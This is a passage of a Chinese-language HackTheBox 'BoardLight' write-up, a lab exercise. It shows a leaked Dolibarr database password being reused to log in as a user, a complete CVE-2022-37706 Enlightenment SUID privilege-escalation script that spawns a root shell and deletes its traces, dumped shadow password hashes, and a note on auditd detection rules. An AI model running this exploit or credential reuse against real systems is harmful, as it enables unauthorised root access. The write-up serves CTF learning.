+<p>The Dolibarr configuration file is <strong>conf&#x2F;conf.php</strong>. It is created by the automatic install process. This file contains the system setup. The setup of the applications you plan to use are defined into the setup area of each module, into the application itself (Menu Home - Setup - Modules).</p>
+<p><a target="_blank" rel="noopener" href="https://wiki.dolibarr.org/index.php?title=Configuration_file">https://wiki.dolibarr.org/index.php?title=Configuration_file</a></p>
+</blockquote>
+<p>沒有conf文件，所以乾脆暴力找一下名字，反正都不會跑。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">www-data@boardlight:~/html/crm.board.htb$ find . -iname <span class="string">&quot;conf.php&quot;</span></span><br><span class="line">./htdocs/conf/conf.php</span><br><span class="line"></span><br><span class="line"><span class="comment"># 然後查看這個配置文件</span></span><br><span class="line">www-data@boardlight:~/html/crm.board.htb$ <span class="built_in">cat</span> ./htdocs/conf/conf.php</span><br><span class="line">&lt;?php</span><br><span class="line">//</span><br><span class="line">// File generated by Dolibarr installer 17.0.0 on May 13, 2024</span><br><span class="line">//</span><br><span class="line">// Take a look at conf.php.example file <span class="keyword">for</span> an example of conf.php file</span><br><span class="line">// and explanations <span class="keyword">for</span> all possibles parameters.</span><br><span class="line">//</span><br><span class="line"><span class="variable">$dolibarr_main_url_root</span>=<span class="string">&#x27;http://crm.board.htb&#x27;</span>;</span><br><span class="line"><span class="variable">$dolibarr_main_document_root</span>=<span class="string">&#x27;/var/www/html/crm.board.htb/htdocs&#x27;</span>;</span><br><span class="line"><span class="variable">$dolibarr_main_url_root_alt</span>=<span class="string">&#x27;/custom&#x27;</span>;</span><br><span class="line"><span class="variable">$dolibarr_main_document_root_alt</span>=<span class="string">&#x27;/var/www/html/crm.board.htb/htdocs/custom&#x27;</span>;</span><br><span class="line"><span class="variable">$dolibarr_main_data_root</span>=<span class="string">&#x27;/var/www/html/crm.board.htb/documents&#x27;</span>;</span><br><span class="line"><span class="variable">$dolibarr_main_db_host</span>=<span class="string">&#x27;localhost&#x27;</span>;</span><br><span class="line"><span class="variable">$dolibarr_main_db_port</span>=<span class="string">&#x27;3306&#x27;</span>;</span><br><span class="line"><span class="variable">$dolibarr_main_db_name</span>=<span class="string">&#x27;dolibarr&#x27;</span>;</span><br><span class="line"><span class="variable">$dolibarr_main_db_prefix</span>=<span class="string">&#x27;llx_&#x27;</span>;</span><br><span class="line"><span class="variable">$dolibarr_main_db_user</span>=<span class="string">&#x27;dolibarrowner&#x27;</span>;</span><br><span class="line"><span class="variable">$dolibarr_main_db_pass</span>=<span class="string">&#x27;serverfun2$2023!!&#x27;</span>;</span><br><span class="line"><span class="variable">$dolibarr_main_db_type</span>=<span class="string">&#x27;mysqli&#x27;</span>;</span><br><span class="line"><span class="variable">$dolibarr_main_db_character_set</span>=<span class="string">&#x27;utf8&#x27;</span>;</span><br><span class="line"><span class="variable">$dolibarr_main_db_collation</span>=<span class="string">&#x27;utf8_unicode_ci&#x27;</span>;</span><br><span class="line">// Authentication settings</span><br><span class="line"><span class="variable">$dolibarr_main_authentication</span>=<span class="string">&#x27;dolibarr&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&lt; 此處省略更多内容 &gt;</span><br></pre></td></tr></table></figure>
+
+<p>看到了有個密碼，所以就嘗試爆破下哪個用戶屬於這個密碼，查看用戶的話可以直接看passwd：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">www-data@boardlight:~/html/crm.board.htb$ <span class="built_in">cat</span> /etc/passwd | grep sh</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">larissa:x:1000:1000:larissa,,,:/home/larissa:/bin/bash</span><br><span class="line">fwupd-refresh:x:128:135:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">sshd:x:129:65534::/run/sshd:/usr/sbin/nologin</span><br></pre></td></tr></table></figure>
+
+<p>然後su 試一下，結果成功的進入larissa這個用戶：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">www-data@boardlight:~/html/crm.board.htb$ su larissa</span><br><span class="line">Password: </span><br><span class="line">larissa@boardlight:/var/www/html/crm.board.htb$ <span class="built_in">id</span></span><br><span class="line">uid=1000(larissa) gid=1000(larissa) <span class="built_in">groups</span>=1000(larissa),4(adm)</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x4-shell-as-larissa-to-root"><a href="#0x4-shell-as-larissa-to-root" class="headerlink" title="0x4 shell as larissa to root"></a>0x4 shell as larissa to root</h2><p>拿到了用戶之後，直接linpeas上來快速看下：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/05-wT0Y0vcJ070N8fQ0-BoardLight/image-20240526104525-67kxtve.png" alt="image">​</p>
+<p>linpeas告訴我出現了一堆沒見過的suid binary，於是網上搜索一下這個exploit：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/05-wT0Y0vcJ070N8fQ0-BoardLight/image-20240526104545-wecr3mc.png" alt="image">​</p>
+<p>看到了exploit db有一個脚本：<a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/51180">https://www.exploit-db.com/exploits/51180</a></p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/05-wT0Y0vcJ070N8fQ0-BoardLight/image-20240526104630-9hu2b56.png" alt="image">​</p>
+<p>但是這個脚本好像裂開了，原本需要換行的地方沒有換行，然後找不到文件就强行指定看看會發生什麽：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/05-wT0Y0vcJ070N8fQ0-BoardLight/image-20240526104804-pcnrzcg.png" alt="image">​</p>
+<p>改完了之後運行看看：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/bash</span></span><br><span class="line"><span class="comment"># Idea by MaherAzzouz</span></span><br><span class="line"><span class="comment"># Development by nu11secur1ty</span></span><br><span class="line"><span class="comment"># Power by @manesec</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;CVE-2022-37706&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[*] Trying to find the vulnerable SUID file...&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[*] This may take few seconds...&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[*] Mod by @manesec.&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># The actual problem</span></span><br><span class="line">file=<span class="string">&quot;/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys&quot;</span></span><br><span class="line"><span class="keyword">if</span> [[ -z <span class="variable">$&#123;file&#125;</span> ]]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;[-] Couldn&#x27;t find the vulnerable SUID file...&quot;</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;[*] Enlightenment should be installed on your system.&quot;</span></span><br><span class="line">        <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] Vulnerable SUID binary found!&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] Trying to pop a root shell!&quot;</span></span><br><span class="line"><span class="built_in">mkdir</span> -p /tmp/net</span><br><span class="line"><span class="built_in">mkdir</span> -p <span class="string">&quot;/dev/../tmp/;/tmp/exploit&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;/bin/sh&quot;</span> &gt; /tmp/exploit</span><br><span class="line"><span class="built_in">chmod</span> a+x /tmp/exploit</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] Welcome to the rabbit hole :)&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$&#123;file&#125;</span> /bin/mount -o noexec,nosuid,utf8,nodev,iocharset=utf8,utf8=0,utf8=1,uid=$(<span class="built_in">id</span> -u), <span class="string">&quot;/dev/../tmp/;/tmp/exploit&quot;</span> /tmp///net</span><br><span class="line"></span><br><span class="line"><span class="built_in">read</span> -p <span class="string">&quot;Press any key to clean the evedence...&quot;</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;Please wait... &quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">sleep</span> 5</span><br><span class="line"><span class="built_in">rm</span> -rf /tmp/exploit</span><br><span class="line"><span class="built_in">rm</span> -rf /tmp/net</span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;Done; Everything is clear ;)&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>運行後就得到了root權限。</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/05-wT0Y0vcJ070N8fQ0-BoardLight/image-20240526104859-o5tkfoj.png" alt="image">​</p>
+<h2 id="Hashes"><a href="#Hashes" class="headerlink" title="Hashes"></a>Hashes</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">root:$6<span class="variable">$h9</span>/xKUsFWX90kjQc<span class="variable">$qcBeHXPiRHqbF0NgNxhPiZzYS1DiH4UnQc2kcshKtYEDPbjDe3E5qihEbapIJk8fAxRaj3T7EGReRQYiFIBHO1</span>:19845:0:99999:7:::</span><br><span class="line">daemon:*:18858:0:99999:7:::</span><br><span class="line">bin:*:18858:0:99999:7:::</span><br><span class="line">sys:*:18858:0:99999:7:::</span><br><span class="line"><span class="built_in">sync</span>:*:18858:0:99999:7:::</span><br><span class="line">games:*:18858:0:99999:7:::</span><br><span class="line">man:*:18858:0:99999:7:::</span><br><span class="line">lp:*:18858:0:99999:7:::</span><br><span class="line">mail:*:18858:0:99999:7:::</span><br><span class="line">news:*:18858:0:99999:7:::</span><br><span class="line">uucp:*:18858:0:99999:7:::</span><br><span class="line">proxy:*:18858:0:99999:7:::</span><br><span class="line">www-data:*:18858:0:99999:7:::</span><br><span class="line">backup:*:18858:0:99999:7:::</span><br><span class="line">list:*:18858:0:99999:7:::</span><br><span class="line">irc:*:18858:0:99999:7:::</span><br><span class="line">gnats:*:18858:0:99999:7:::</span><br><span class="line">nobody:*:18858:0:99999:7:::</span><br><span class="line">systemd-network:*:18858:0:99999:7:::</span><br><span class="line">systemd-resolve:*:18858:0:99999:7:::</span><br><span class="line">systemd-timesync:*:18858:0:99999:7:::</span><br><span class="line">messagebus:*:18858:0:99999:7:::</span><br><span class="line">syslog:*:18858:0:99999:7:::</span><br><span class="line">_apt:*:18858:0:99999:7:::</span><br><span class="line">tss:*:18858:0:99999:7:::</span><br><span class="line">uuidd:*:18858:0:99999:7:::</span><br><span class="line">tcpdump:*:18858:0:99999:7:::</span><br><span class="line">avahi-autoipd:*:18858:0:99999:7:::</span><br><span class="line">usbmux:*:18858:0:99999:7:::</span><br><span class="line">dnsmasq:*:18858:0:99999:7:::</span><br><span class="line">cups-pk-helper:*:18858:0:99999:7:::</span><br><span class="line">speech-dispatcher:!:18858:0:99999:7:::</span><br><span class="line">avahi:*:18858:0:99999:7:::</span><br><span class="line">kernoops:*:18858:0:99999:7:::</span><br><span class="line">saned:*:18858:0:99999:7:::</span><br><span class="line">hplip:*:18858:0:99999:7:::</span><br><span class="line">whoopsie:*:18858:0:99999:7:::</span><br><span class="line">colord:*:18858:0:99999:7:::</span><br><span class="line">geoclue:*:18858:0:99999:7:::</span><br><span class="line">pulse:*:18858:0:99999:7:::</span><br><span class="line">gdm:*:18858:0:99999:7:::</span><br><span class="line">sssd:*:18858:0:99999:7:::</span><br><span class="line">larissa:$6$zNTCKunWYdACDiCg<span class="variable">$m1Ci3x</span>/AkPAUZM/YzNIXd7Ou89u/hMPPRAboFhbbevXu30s2PNtXcUvO3K1IwKIyxh.UKsonvBxKzDkedo7cw0:19860:0:99999:7:::</span><br><span class="line">systemd-coredump:!!:19617::::::</span><br><span class="line">mysql:!:19617:0:99999:7:::</span><br><span class="line">fwupd-refresh:*:19617:0:99999:7:::</span><br><span class="line">sshd:*:19845:0:99999:7:::</span><br><span class="line">_laurel:!:19860::::::</span><br></pre></td></tr></table></figure>
+
+<h2 id="Out-of-the-box-auditd"><a href="#Out-of-the-box-auditd" class="headerlink" title="Out of the box - auditd"></a>Out of the box - auditd</h2><p>一開始的時候看到一對日志，然後裏面會有一堆内容</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/05-wT0Y0vcJ070N8fQ0-BoardLight/image-20240526111241-49u5xsd.png" alt="image">​</p>
+<p>而且普通的賬號就有adm的組，也就是說當前用戶是可以讀取裏面的文件，這些是什麽？</p>
+<p>在linux裏面有一個叫auditd的工具，用來紀錄和監控kernel的底層api，擧個例子，儅有一個程序需要執行外部命令的時候，比如python也好，c語言也好，有一個類似<code>os.system</code>​的函數。</p>
+<p>如果你使用這個函數去執行外部命令就會用到syscall，<a target="_blank" rel="noopener" href="https://sys.readthedocs.io/en/latest/doc/05_calling_system_calls.html#calling-the-system-call">具體可以參考這裏</a>，auditd可以監控syscall的行爲，就可以記錄一些應用程序敲過的命令，然後就可以在本地的 <code>/var/log/audit/audit.log</code>​看到。</p>
+<p><strong>你可以設想一下</strong>：我是藍隊，我要確保機器沒有被中木馬，如果我不用auditd來監控，只是記錄bash的命令的話，我不調用bash那是不是沒辦法記錄了？</p>
+<p>auditd完成后，也只是一個殼，你需要告訴auditd記錄一些什麽，常見的soc會直接去github找一些人家寫好的auditd，比如這臺機器，你可以在 <code>/etc/audit</code>​ 下找到</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@boardlight:/etc/audit<span class="comment"># ls -lah</span></span><br><span class="line">total 56K</span><br><span class="line">drwxr-x---   4 root root 4.0K May 17 01:36 .</span><br><span class="line">drwxr-xr-x 128 root root  12K May 17 01:32 ..</span><br><span class="line">-rw-r-----   1 root root  127 Feb 18  2020 audit-stop.rules</span><br><span class="line">-rw-r-----   1 root root  19K May 17 01:36 audit.rules</span><br><span class="line">-rw-r-----   1 root root  103 May 17 01:36 audit.rules.prev</span><br><span class="line">-rw-r-----   1 root root  804 Feb 18  2020 auditd.conf</span><br><span class="line">drwxr-xr-x   3 root root 4.0K May 17 01:36 plugins.d</span><br><span class="line">drwxr-x---   2 root root 4.0K May 17 01:31 rules.d</span><br></pre></td></tr></table></figure>
+
+<p>然後這臺機器也是用了常見的開源項目：<a target="_blank" rel="noopener" href="https://github.com/linux-audit/audit-userspace">https://github.com/linux-audit/audit-userspace</a></p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/05-wT0Y0vcJ070N8fQ0-BoardLight/image-20240526111441-pz6bcfi.png" alt="image">​</p>
+<p>至於哪一條規則可以通過grep execve看到。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@boardlight:/etc/audit/rules.d<span class="comment"># cat audit.rules  | grep execve</span></span><br><span class="line">-a always,<span class="built_in">exit</span> -F <span class="built_in">arch</span>=b64 -S execve -F euid=33 -k detect_execve_www</span><br><span class="line"><span class="comment">### When combined with &quot;fexecve&quot; can be used to stealthily run binaries in memory without touching disk</span></span><br><span class="line">-a always,<span class="built_in">exit</span> -F <span class="built_in">arch</span>=b64 -F euid=0 -F auid&gt;=1000 -F auid!=-1 -S execve -k rootcmd</span><br></pre></td></tr></table></figure>
+
+<p>當然告訴完audit需要監控什麽之後，需要啓動audit的服務：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">root@boardlight:/etc<span class="comment"># systemctl status</span></span><br><span class="line">● boardlight</span><br><span class="line">    State: degraded</span><br><span class="line">     Jobs: 0 queued</span><br><span class="line">   Failed: 1 units</span><br><span class="line">    Since: Sat 2024-05-25 12:01:57 PDT; 8h ago</span><br><span class="line">   CGroup: /</span><br><span class="line">           ├─init.scope</span><br><span class="line">           │ └─1 /sbin/init auto noprompt</span><br><span class="line">           └─system.slice</span><br><span class="line">             ├─irqbalance.service</span><br><span class="line">             │ └─654 /usr/sbin/irqbalance --foreground</span><br><span class="line">             ├─apache2.service</span><br><span class="line">             │ ├─874 /usr/sbin/apache2 -k start</span><br><span class="line">             │ ├─875 /usr/sbin/apache2 -k start</span><br><span class="line">             │ ├─876 /usr/sbin/apache2 -k start</span><br><span class="line">             │ └─877 /usr/sbin/apache2 -k start</span><br><span class="line">             ├─open-vm-tools.service</span><br><span class="line">             │ └─593 /usr/bin/vmtoolsd</span><br><span class="line">             ├─systemd-udevd.service</span><br><span class="line">             │ └─367 /lib/systemd/systemd-udevd</span><br><span class="line">             ├─whoopsie.service</span><br><span class="line">             │ └─842 /usr/bin/whoopsie -f</span><br><span class="line">             ├─cron.service</span><br><span class="line">             │ └─646 /usr/sbin/cron -f</span><br><span class="line">             ├─auditd.service</span><br><span class="line">             │ └─498 /sbin/auditd</span><br><span class="line">&lt; 省略一些沒用的東西 &gt; </span><br></pre></td></tr></table></figure>
+
+<p>假如我輸入<code>cat /var/log/audit/audit.log</code>​，bash會執行一次 execve， 這樣然後就可以在<code>/var/log/audit/audit.log</code>​ 看到了：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/05-wT0Y0vcJ070N8fQ0-BoardLight/image-20240526111715-iedjcp1.png" alt="image">​</p>
+<p><strong>題外話</strong>：一般爲了節省人力資源和防止日志被刪除，都會使用 elk 或者 splunk 的 agent去把日志傳到中心的日志系統去做統一的管理，以前會使用wazuh比較多一點，現在好多都改成elk。</p>
+<h1 id="Thanks"><a href="#Thanks" class="headerlink" title="Thanks"></a>Thanks</h1><p><strong>Respect</strong>: If my writeup really helps you, <a target="_blank" rel="noopener" href="https://app.hackthebox.com/users/463126">Give me a respect</a> to let me know， Thankssssss!</p>
+<p><strong>感謝</strong>: 製作不易，如果我的writeup真的幫到你了, <a target="_blank" rel="noopener" href="https://app.hackthebox.com/users/463126">給我一個respect</a>，這樣我就會知道，感謝你！</p>
+
+    <iframe src="/maneplugin/badge/htb.html" style="border:none; height: 70px" title="description"></iframe>
+
+
+<p><strong>Found Mistakes</strong>: If you find something wrong in the page, please feel free email to <a href="mailto:&#x6d;&#97;&#x6e;&#101;&#64;&#x6d;&#x61;&#x6e;&#x65;&#x73;&#101;&#x63;&#x2e;&#x63;&#x6f;&#109;">&#x6d;&#97;&#x6e;&#101;&#64;&#x6d;&#x61;&#x6e;&#x65;&#x73;&#101;&#x63;&#x2e;&#x63;&#x6f;&#109;</a> thanksss !!!</p>
+<p><strong>發現一些錯誤</strong>: 如果你在文章中發現一些錯誤，請發郵件到 <a href="mailto:&#x6d;&#x61;&#110;&#x65;&#64;&#109;&#x61;&#x6e;&#101;&#115;&#101;&#99;&#x2e;&#x63;&#x6f;&#109;">&#x6d;&#x61;&#110;&#x65;&#64;&#109;&#x61;&#x6e;&#101;&#115;&#101;&#99;&#x2e;&#x63;&#x6f;&#109;</a> ，麻煩了！！</p>
+<p><strong>Beginner Recommand</strong>: <a target="_blank" rel="noopener" href="https://referral.hackthebox.com/mz8fyQS">If you are a beginner, please use this link to sign up for an HTB Academy to get more Higher level of knowledge.</a></p>
+<p><strong>新手非常推薦</strong>: <a target="_blank" rel="noopener" href="https://referral.hackthebox.com/mz8fyQS">如果你是初學者，可以用此鏈接來嘗試注冊 HTB Academy 賬號。</a></p>
+<p>使用上面的鏈接加入 HTB 的 academy 就可以免費看 Tire 0 的所有教程，這對初學者來説是很友好的。 （建議先完成 INTRODUCTION TO ACADEMY）</p>
+<p>Join HTB’s academy with this link to get free access to all the tutorials for Tire 0. This is very beginner friendly. (It is recommended to complete INTRODUCTION TO ACADEMY first)</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <script>
+        setTimeout(() => {
+          makeList({
+             'target': '#toc-mobile',   // Selector for element to place table of contents
+             'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+          });
+        }, 1000);
+      </script>
+    
+    <div id="toc-footer" style="display: none">
+      <div id="toc-mobile"></div>
+    </div>
+
+    <style>
+        #toc-mobile {
+        }
+        #toc-mobile ul {
+           display: grid ! important;
+        }
+        #toc-mobile li {
+           margin: 0 0 0 0 ! important;
+        }
+        #toc-mobile .level-1 {
+           color: #00b4dd ;
+        }
+        #toc-mobile .level-2 {
+           color: #2bbc8a;
+        }
+        #toc-mobile .level-3 {
+           color: #40474b;
+        }
+        #toc-mobile .level-4, #toc-mobile .level-5, #toc-mobile .level-6 {
+           color: #8c8c8c;
+        }
+    </style>
+
+
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://manesec.github.io/2024/05/26/2024-htb-machine/21-BoardLight/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://manesec.github.io/2024/05/26/2024-htb-machine/21-BoardLight/&text=HackTheBox - Machine - BoardLight"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://manesec.github.io/2024/05/26/2024-htb-machine/21-BoardLight/&title=HackTheBox - Machine - BoardLight"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://manesec.github.io/2024/05/26/2024-htb-machine/21-BoardLight/&is_video=false&description=HackTheBox - Machine - BoardLight"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HackTheBox - Machine - BoardLight&body=Check out this article: https://manesec.github.io/2024/05/26/2024-htb-machine/21-BoardLight/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://manesec.github.io/2024/05/26/2024-htb-machine/21-BoardLight/&title=HackTheBox - Machine - BoardLight"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://manesec.github.io/2024/05/26/2024-htb-machine/21-BoardLight/&title=HackTheBox - Machine - BoardLight"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://manesec.github.io/2024/05/26/2024-htb-machine/21-BoardLight/&title=HackTheBox - Machine - BoardLight"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://manesec.github.io/2024/05/26/2024-htb-machine/21-BoardLight/&title=HackTheBox - Machine - BoardLight"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://manesec.github.io/2024/05/26/2024-htb-machine/21-BoardLight/&name=HackTheBox - Machine - BoardLight&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://manesec.github.io/2024/05/26/2024-htb-machine/21-BoardLight/&t=HackTheBox - Machine - BoardLight"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+      
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+  
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2024
+    manesec
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- Add space -->
+<script src="https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js"></script>
+<script>
+  document.addEventListener('DOMContentLoaded', () => {
+    // listen to any DOM change and automatically perform spacing via MutationObserver()
+    pangu.autoSpacingPage();
+  });
+</script>
+
+<!-- fancybox support -->
+
+       <script type="text/javascript" src="/js/fancybox/jquery.fancybox.min.js"></script>
+       <script type="text/javascript" src="/js/wrapImage.js"></script>
+   
+
+
+
+<!-- clipboard -->
+
+  
